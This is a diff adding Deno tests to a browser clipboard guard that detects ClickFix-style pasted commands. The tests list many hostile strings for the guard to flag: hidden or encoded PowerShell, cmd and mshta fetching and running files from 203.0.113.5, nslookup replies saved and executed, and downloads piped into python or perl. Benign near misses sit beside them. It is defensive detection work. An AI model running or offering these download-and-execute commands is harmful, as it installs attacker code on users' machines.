@@ -91,11 +91,126 @@ Deno.test("clipboard guard patterns: the 2026-11-16 ClickFix forms match; near-m
   for (const s of BENIGN) assert(!g.matchDangerous(s), "false positive: " + s);
 });
 
+// powershell.exe takes a switch after "/", "-", "--" or a Unicode dash, and
+// any prefix of its name; WindowStyle 1 is Hidden. cmd takes other switches
+// before /c. These forms passed before (2026-11-27).
+const MISSED_2026_11_27 = [
+  "powershell /enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
+  "powershell \u2013enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
+  "powershell.exe \u2014e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
+  "pwsh --EncodedC SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
+  "powershell /w hidden -c \"Start-Process calc\"",
+  "powershell -w 1 -c \"Start-Process calc\"",
+  "powershell -WindowS Hidden -c \"Start-Process calc\"",
+  "powershell -nop \u2015w h -c \"Start-Process calc\"",
+  "cmd /q /c curl -o %TEMP%\\a.exe https://203.0.113.5/a.exe && %TEMP%\\a.exe",
+  "cmd.exe /v:on /c curl -o a.exe https://203.0.113.5/a.exe",
+  "cmd/c start /min mshta https://203.0.113.5/v.hta",
+  "powershell /file \\\\203.0.113.5\\share\\x.ps1",
+];
+const BENIGN_2026_11_27 = [
+  "powershell -ExecutionPolicy Unrestricted -File setup.ps1",
+  "powershell -WindowStyle Normal -Command Get-Date",
+  "powershell -w maximized -c Get-Date",
+  "powershell -c \"Get-Process | Out-String -Width 1\"",
+  "powershell -c Remove-Item x.txt -WhatIf 1",
+  "cmd /q /c echo hello",
+  "cmd /d /c dir C:\\Users",
+];
+
+Deno.test("clipboard guard patterns: /, Unicode dashes, switch prefixes, WindowStyle 1 and cmd switches before /c match; near misses do not", () => {
+  const g = loadClip();
+  const missed = MISSED_2026_11_27.filter((s) => !g.matchDangerous(s));
+  assert(missed.length === 0, "missed: " + JSON.stringify(missed));
+  const fp = BENIGN_2026_11_27.filter((s) => g.matchDangerous(s));
+  assert(fp.length === 0, "false positive: " + JSON.stringify(fp));
+});
+
+// The DNS form of ClickFix (nslookup reply run as commands), a download piped
+// into python / perl / ruby, and a download into %TEMP% that is started on the
+// same line. These passed before (2026-11-27).
+const MISSED_2026_11_27_B = [
+  "cmd /c \"nslookup -q=txt verify.example 203.0.113.5 | findstr ^Name: > %TEMP%\\a.cmd && %TEMP%\\a.cmd\"",
+  "nslookup verify.example 203.0.113.5 | findstr \"^Name:\" | for /f \"tokens=1,* delims=:\" %a in ('more') do @echo %b | cmd",
+  "curl -k https://203.0.113.5/a -o $env:TEMP\\a.exe; Start-Process $env:TEMP\\a.exe",
+  "curl -o %APPDATA%\\u.exe https://203.0.113.5/u.exe & start %APPDATA%\\u.exe",
+  "wget -O- http://203.0.113.5/a | python3",
+  "curl http://203.0.113.5/a.py | python",
+  "curl -fsSL http://203.0.113.5/a | sudo /usr/bin/python3 -",
+  "curl -s http://203.0.113.5/a.pl | perl",
+];
+const BENIGN_2026_11_27_B = [
+  "curl https://example.test/data.json | python3 -m json.tool",
+  "curl -s https://api.example.test | python -c 'import json,sys'",
+  "curl https://example.test/install.pl | perl -c",
+  "nslookup example.com",
+  "nslookup example.com | findstr Address",
+  "curl -o %TEMP%\\a.zip https://example.test/?a=1&b=2",
+  "curl -o %TEMP%\\a.zip https://example.test/start",
+  "wget -O $env:TEMP\\a.zip https://example.test/a.zip",
+];
+
+Deno.test("clipboard guard patterns: nslookup run as commands, pipe to python/perl/ruby and a %TEMP% download started on the line match; near misses do not", () => {
+  const g = loadClip();
+  const missed = MISSED_2026_11_27_B.filter((s) => !g.matchDangerous(s));
+  assert(missed.length === 0, "missed: " + JSON.stringify(missed));
+  const fp = BENIGN_2026_11_27_B.filter((s) => g.matchDangerous(s));
+  assert(fp.length === 0, "false positive: " + JSON.stringify(fp));
+});
+
+// Review 2026-11-27 (false positives of the new patterns). "-w 1" counts
+// only as a switch of powershell itself, not inside the -c payload. A pipe
+// into "python3 -" also matches with arguments after the "-". nslookup into
+// %TEMP% matches only when that file then runs.
+const MISSED_2026_11_27_C = [
+  "powershell -NoP -Exec Bypass -w 1 -c \"Start-Process calc\"",
+  "\"powershell.exe\" -nop -WindowStyle 1 -c \"Start-Process calc\"",
+  "pwsh -ep bypass /w 1 -c \"Start-Process calc\"",
+  "curl -sSL http://203.0.113.5/a | python3 - --version 1.8.0",
+  "curl http://203.0.113.5/a | sudo python -",
+  "nslookup -q=txt verify.example 203.0.113.5 > %TEMP%\\a.cmd & call %TEMP%\\a.cmd",
+  "nslookup -q=txt verify.example 203.0.113.5 > $env:TEMP\\a.ps1; & $env:TEMP\\a.ps1",
+  "nslookup -q=txt verify.example 203.0.113.5 > %TEMP%\\a.cmd && cmd /c %TEMP%\\a.cmd",
+  "nslookup -q=txt verify.example 203.0.113.5 > %TEMP%\\a.cmd && start \"\" %TEMP%\\a.cmd",
+  "nslookup -q=txt verify.example 203.0.113.5 > $env:TEMP\\a.ps1; powershell -ep bypass -f $env:TEMP\\a.ps1",
+  "nslookup -q=txt verify.example 203.0.113.5 > %TEMP%\\a.vbs & wscript %TEMP%\\a.vbs",
+  "powershell -ver 2 -w 1 -c \"Start-Process calc\"",
+  "powershell -o text -w 1 -c \"Start-Process calc\"",
+  "pwsh -config x -w 1 -c \"Start-Process calc\"",
+  "powershell -noprofile -noninteractive -sta -mta -nologo -nop -nop -nop -nop -w 1 -c \"Start-Process calc\"",
+  "wget -O %TEMP%\\a.exe https://203.0.113.5/a.exe -o log.txt && %TEMP%\\a.exe",
+];
+const BENIGN_2026_11_27_C = [
+  "powershell -c \"ping -n 1 -w 1 192.0.2.1\"",
+  "powershell ping -n 1 -w 1 192.0.2.1",
+  "powershell -nop ping -n 1 -w 1 192.0.2.1",
+  "powershell -File .\\x.ps1 -w 1",
+  "powershell -Command \"Test-Connection 192.0.2.1 -Count 1; ping -w 1 192.0.2.1\"",
+  "nslookup example.com > %TEMP%\\dns.txt",
+  "nslookup example.com > %TEMP%\\dns.txt && notepad %TEMP%\\dns.txt",
+  "curl https://example.test/data.json | python3 -m json.tool --sort-keys",
+];
+
+Deno.test("clipboard guard patterns: powershell's own -w 1, python3 - with arguments and a %TEMP% nslookup file that runs match; near misses do not", () => {
+  const g = loadClip();
+  const missed = MISSED_2026_11_27_C.filter((s) => !g.matchDangerous(s));
+  assert(missed.length === 0, "missed: " + JSON.stringify(missed));
+  const fp = BENIGN_2026_11_27_C.filter((s) => g.matchDangerous(s));
+  assert(fp.length === 0, "false positive: " + JSON.stringify(fp));
+  for (const s of [...MISSED_2026_11_27, ...MISSED_2026_11_27_B, ...DANGEROUS]) assert(g.matchDangerous(s), "missed: " + s);
+});
+
+Deno.test("clipboard guard: the Poetry and get-pip installer hosts are safe", () => {
+  const g = loadClip();
+  for (const h of ["python-poetry.org", "install.python-poetry.org", "pypa.io", "bootstrap.pypa.io", "pip.pypa.io"]) assert(g.onSafeHost(h), h);
+  for (const h of ["python-poetry.org.example.test", "evilpypa.io"]) assert(!g.onSafeHost(h), h);
+});
+
 Deno.test("clipboard guard patterns stay linear: 100 KB adversarial inputs are checked fast", () => {
   const g = loadClip();
   const size = 100 * 1024;
   const fill = (unit) => unit.repeat(Math.ceil(size / unit.length)).slice(0, size);
-  const inputs = ["curl|", "curl | ", "curl |/", "wget | sudo ", "bash <(", "sh -c $(", "finger |", "\\\\a", "\\\\a@", "msiexec /i ", "regsvr32 /i:", "powershell -f ", "pwsh ", "a", " ", "/"].map(fill);
+  const inputs = ["curl|", "curl | ", "curl |/", "wget | sudo ", "bash <(", "sh -c $(", "finger |", "\\\\a", "\\\\a@", "msiexec /i ", "regsvr32 /i:", "powershell -f ", "pwsh ", "pwsh /", "pwsh \u2013", "cmd /q", "cmd/v:on ", "nslookup ", "nslookup >", "curl | python", "curl -o %temp% ", "curl -o %temp%&", "iwr -o %tmp% ", "curl curl -o %temp% -o %temp% ", "nslookup > %temp% ", "nslookup > %temp% & ", "powershell -nop ", "pwsh -ep x -w ", "a", " ", "/"].map(fill);
   // A generous limit: the machine is shared. A quadratic pattern takes
   // seconds on these inputs.
   const LIMIT_MS = 500;
@@ -542,4 +657,39 @@ Deno.test({
       assert(/const dataGet = meGetter\("data"\);/.test(s) && /const ps = portsOf\(event\);/.test(s) && !/m\.data\.f/.test(s), f + " reads the port through captured getters");
     }
   },
+});
+
+// The block notice must stay visible over a page's modal <dialog> or popover
+// (a fake "verify you are human" screen), so it goes into the top layer.
+Deno.test("clipboard notice: opened as a manual popover in the top layer, plain fixed box without showPopover", () => {
+  const notice = (show) => {
+    const made = [];
+    const el = () => {
+      const e = { attrs: {}, style: { cssText: "" }, children: [], setAttribute(k, v) { this.attrs[k] = v; }, appendChild(c) { this.children.push(c); }, remove() {}, attachShadow() { return this; } };
+      made.push(e);
+      return e;
+    };
+    const body = el();
+    const doc = { createElement: el, body, documentElement: body };
+    const shown = [];
+    const fn = new Function(`${unwrapMain(clipboardSource)}\nreturn clipboardGuardNotice;`)();
+    const realSetTimeout = globalThis.setTimeout;
+    let host;
+    try {
+      globalThis.setTimeout = () => 0;
+      fn(doc, show ? function () { shown.push(this); } : null)({});
+      host = body.children[0];
+    } finally {
+      globalThis.setTimeout = realSetTimeout;
+    }
+    return { host, shown };
+  };
+  const top = notice(true);
+  assert(top.host && top.host.attrs.popover === "manual", "host is a manual popover");
+  assert(top.shown.length === 1 && top.shown[0] === top.host, "showPopover called on the host");
+  assert(/inset:auto/.test(top.host.style.cssText) && /border:0/.test(top.host.style.cssText), "popover UA box styles reset");
+  assert(top.host.children[0].attrs.role === "alert", "alert box inside");
+  assert(/Ctrl\+C \(Cmd\+C on a Mac\)/.test(top.host.children[0].textContent), "names the Mac shortcut too: " + top.host.children[0].textContent);
+  const plain = notice(false);
+  assert(plain.host && !("popover" in plain.host.attrs) && plain.shown.length === 0, "no popover without showPopover");
 });
